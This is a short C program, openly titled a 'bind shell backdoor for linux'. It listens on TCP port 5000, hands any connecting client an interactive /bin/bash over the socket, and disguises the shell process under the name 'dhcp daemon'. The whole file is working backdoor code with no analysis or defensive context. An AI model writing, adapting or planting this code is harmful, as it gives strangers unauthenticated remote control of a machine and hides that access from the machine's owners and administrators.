  
 
 /****************************************************************************
bind shell backdoor for linux
avalon78-2011
****************************************************************************/
 
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h> 
#include <netinet/in.h>
#include <unistd.h>



#define PORT 5000
#define LISTEN_BACKLOG 5



int main()
{
  
  int sockfd,client_sock_len,client_sock,ret;
  pid_t pid;
  struct sockaddr_in  server_addr,client_addr; 
   
  sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); 
   if(sockfd==-1 )
   {
    perror("socket() failed!");
     return -1;
   }
   
   server_addr.sin_family=AF_INET;
   server_addr.sin_port=htons(PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

   ret=bind(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr));
   if(ret==-1 )
   {
    perror("bind() failed!");
     return -1;
   }
   
   ret=listen(sockfd,LISTEN_BACKLOG);
   if(ret==-1) 
   {
     perror("listen() failed!");
     return -1;
   }
   
  
     client_sock_len = sizeof(client_addr);

    client_sock=accept(sockfd, (struct sockaddr *) &client_addr, &client_sock_len);
    if( client_sock==-1)
    {
      perror("accept() failed!");
      return -1;
    }
   
   //fork child process into background
   pid=fork();
   
   if(pid==0)
   {
    // close old listener
    close(sockfd);
    //redirect stdin,stdout,stderr to the socket
    dup2(client_sock,0); 
    dup2(client_sock,1); 
    dup2(client_sock,2);
    ret=execl("/bin/bash", "dhcp daemon",(char *)0);
    
    if(ret==-1)
    {
      perror("execl() failed!!");
            return -1;
    }
    
    }
   
   else if (pid==-1)
   {
     perror("fork() failed!!");
        return -1;

   }
   //end of parent process ,child process still running...
   else if(pid>0)
   {
     return 0;
     
   }
   
   
}
  
  
  
  
  
  
  